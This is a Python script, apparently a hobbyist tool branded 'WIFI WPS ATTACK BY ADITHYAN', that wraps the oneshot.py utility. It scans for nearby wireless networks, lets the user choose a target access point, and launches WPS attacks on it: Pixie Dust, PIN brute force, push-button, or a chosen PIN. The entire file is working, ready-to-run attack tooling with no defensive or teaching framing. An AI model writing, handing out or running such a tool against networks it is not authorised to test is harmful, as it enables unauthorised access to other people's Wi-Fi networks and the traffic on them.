#!/usr/bin/env python3





#__-_-_-_-_-_+_-_-_-_+_+_+_+.  Colour 

class Colors:
    G = '\033[1;32m'   
    C = '\033[1;36m'   
    Y = '\033[1;33m'   
    R = '\033[1;31m'
    B = '\033[1;34m'
    M = '\033[1;35m'   
    W = '\033[1;37m'   
    N = '\033[0m'
    BOLD = '\033[1m'
    
import os
import sys
import subprocess
import re

def clear():
    os.system('clear')

def run_cmd(cmd, timeout=45):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except:
        return ""



## interface 


def get_interfaces():
    print(f"{Colors.Y}{Colors.BOLD}[*] Detecting wireless interfaces..{Colors.W}")
    out = run_cmd("iw dev 2>/dev/null | grep -oP 'Interface \\K\\S+'")
    if not out.strip():
        out = run_cmd("ls /sys/class/net/ | grep -E 'wlan|wlp|p2p'")
    return [x.strip() for x in out.splitlines() if x.strip()]

def select_interface():
    ifaces = get_interfaces()
    if not ifaces:
        print("[!] No wireless interfaces found!")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("Available Wireless Interfaces")
    print("="*60)
    for i, iface in enumerate(ifaces, 1):
        print(f"  {i}. {iface}")
    print("="*60)
    
    while True:
        try:
            ch = int(input("\nSelect interface number: ")) - 1
            if 0 <= ch < len(ifaces):
                return ifaces[ch]
                
        except:
            print("Invalid input.")

def scan_networks(iface):
    clear()
    print(f"{Colors.Y}{Colors.BOLD}")
    print(f"\n{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}")
    print(f"          {Colors.Y}{Colors.BOLD} WIFI WPS ATTACK BY ADITHYAN {Colors.Y}")
    print(f"{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.W}\n")
   # print(" ")
    print(f"\n[*] SCANNING WI-FI ON {iface} ...")
    output = run_cmd(f"timeout 35s sudo python3 oneshot.py -i {iface} --reverse-scan 2>&1")

    networks = []
    seen = set()

    for line in output.splitlines():
        bssid_match = re.search(r'([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})', line)
        if not bssid_match:
            continue
        bssid = bssid_match.group(1)
        if bssid in seen:
            continue
        seen.add(bssid)

        # ESSID my
        essid = "Hidden"
        essid_match = re.search(r'\s+([^\s].*?)\s+(?:-\d+|\d+\s*dBm|Channel)', line)
        if essid_match:
            essid = essid_match.group(1).strip()[:35]

        # Security fm
        security = "WPA/WPA2"
        if re.search(r'WPS', line, re.IGNORECASE):
            security = "WPA/WPS"
        elif not re.search(r'WPA', line, re.IGNORECASE):
            security = "Open?"

        networks.append((bssid, essid, security))

    return networks

def select_network(networks):
    clear()
    
    if not networks:
   
        print("[!] No networks found.")
        return input("\nEnter target BSSID manually: ").strip()

    print("\n" + "="*60)
    print(f"{'#':<3} {'BSSID':<18} {'ESSID':<16} Security")
    print("="*60)
    for i, (bssid, essid, security) in enumerate(networks, 1):
        print(f"{i:<3} {essid:<30} {security}")
    print("="*60)

    while True:
        try:
            choice = input("\nEnter number to attack (0 = manual): ").strip()
            if choice == '0':
                return input("Enter BSSID: ").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                selected = networks[idx]
                print(f"\n[+] Selected: {selected[0]} | {selected[1]}")
                return selected[0]
        except:
            print("Invalid choice.")
  
def select_attack_mode():
    clear()
    print(f"{Colors.Y}{Colors.BOLD}")
    print(f"\n{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}")
    print(f"          {Colors.Y}{Colors.BOLD} WIFI WPS ATTACK BY ADITHYAN {Colors.Y}")
    print(f"{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}\n")
   # print(" ")
    print(f"{Colors.R}{Colors.BOLD}[*] [ ATTACK MODE ]{Colors.R}\n")
   # print(" ")
    print(f"{Colors.W}{Colors.BOLD} [1] Pixie Dust      (-K){Colors.W}")
    
  #  print(" ")
    print(" [2] Bruteforce      (-B)")
  #  print(" ")
    print(" [3] Push Button    (-PBC)")
    
    print(" [4] Pixel Force     (-F")
    #print(" ")
    print(" [5] Specific PIN    (-X)")
  #  print(" ")
    
    ch = input("\nChoose (1-5): ").strip()
    if ch == "1": return "-K"
    if ch == "2": return "-B"
    if ch == "3": return "--pbc"
    if ch == "4": return "-F"
    if ch == "5":
        pin = input("Enter PIN: ").strip()
        return f"-p {pin}"
    return "-K"
    #clear()
    #clear()

#def 

       
def main():
    clear()
    print(f"{Colors.Y}{Colors.BOLD}")
    print(f"\n{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}")
    print(f"          {Colors.Y}{Colors.BOLD} WIFI WPS ATTACK BY ADITHYAN {Colors.Y}")
    print(f"{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.W}\n")
      
                  
            
      
    if os.geteuid() != 0:
        print("[!] Run with: sudo python3 oneshot_wrapper.py")
        sys.exit(1)
   #     clear()
    iface = select_interface()
    bssid = select_network(scan_networks(iface))
    mode = select_attack_mode()

  #  extra = " --iface-down" if input("\nUse --iface-down? (y/N): ").lower() == 'y' else ""

    cmd = f"sudo python3 oneshot.py -i {iface} -b {bssid} {mode}"
   # print(

    try:
        #clear()
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main()
    sys.exit(1)